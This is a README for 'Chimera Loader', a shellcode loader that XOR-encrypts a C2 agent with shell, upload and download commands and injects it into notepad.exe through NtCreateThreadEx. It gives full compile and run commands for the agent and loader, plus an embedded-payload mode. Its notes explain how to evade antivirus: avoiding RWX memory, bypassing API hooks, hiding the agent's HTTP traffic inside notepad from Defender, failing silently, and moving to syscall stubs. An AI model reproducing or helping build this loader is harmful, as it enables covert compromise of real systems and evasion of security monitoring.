# Chimera Loader

Shellcode loader that injects the Chimera agent into `notepad.exe` using `NtCreateThreadEx` (less monitored than `CreateRemoteThread`).

## Build flow

```
chimera.exe  →  [donut]  →  shellcode.bin  →  [XOR encrypt]  →  shellcode.bin.enc
                                                                        ↓
                                                                   loader.exe
```

## Requirements

- Windows VM with .NET Framework 4.8 SDK or Visual Studio
- [donut](https://github.com/TheWover/donut/releases) — download `donut.exe` and place in `loader/`
- Python 3.6+ (for `build_loader.py`)

## Step-by-step

### 1. Compile Chimera agent first

From the `agent_code/` directory on your Windows VM:

```cmd
csc /target:winexe /platform:x86 /out:chimera.exe ^
    Program.cs Config.cs C2Http.cs Tasking.cs StringHelper.cs ^
    Commands\Shell.cs Commands\Upload.cs Commands\Download.cs ^
    Commands\Ls.cs Commands\Pwd.cs Commands\Cd.cs ^
    Commands\Sleep.cs Commands\Kill.cs
```

### 2. Convert to shellcode and encrypt

```cmd
cd loader\
python build_loader.py --agent ..\agent_code\chimera.exe
```

This produces `shellcode.bin.enc` in the `loader/` directory.

Optional — bake shellcode directly into the EXE (no external file needed at runtime):

```cmd
python build_loader.py --agent ..\agent_code\chimera.exe --embed
```

This also generates `ShellcodeData.cs`. If using embedded mode, edit `Loader.cs`:
- Replace `File.ReadAllBytes(shellcodePath)` with `ShellcodeData.Bytes`
- Add `ShellcodeData.cs` to the compile command below

### 3. Compile the loader

```cmd
csc /target:exe /platform:x86 /out:loader.exe Loader.cs
```

With embedded shellcode:

```cmd
csc /target:exe /platform:x86 /out:loader.exe Loader.cs ShellcodeData.cs
```

### 4. Run

External file mode — `shellcode.bin.enc` must be in same directory as `loader.exe`:

```cmd
loader.exe
```

Embedded mode — just run `loader.exe` anywhere, no extra files.

## How it works

1. Decrypts XOR-encrypted shellcode in memory
2. Finds a running `notepad.exe` process, or spawns one hidden
3. Allocates RW memory in notepad's address space
4. Writes shellcode
5. Flips memory to RX (write-then-protect avoids RWX which is flagged)
6. Creates remote thread via `NtCreateThreadEx` (ntdll.dll direct call, bypasses some hooks)
7. Chimera runs inside notepad's process — Defender sees notepad making HTTP calls

## Notes

- Change `XOR_KEY` in both `Loader.cs` and `build_loader.py` before building (they must match)
- The loader fails silently — no error dialogs
- donut's `-e 3` flag adds entropy/string encryption to the shellcode itself, helping with static scans
- For better evasion, look into replacing `NtCreateThreadEx` with a syscall stub (SysWhispers2/3)
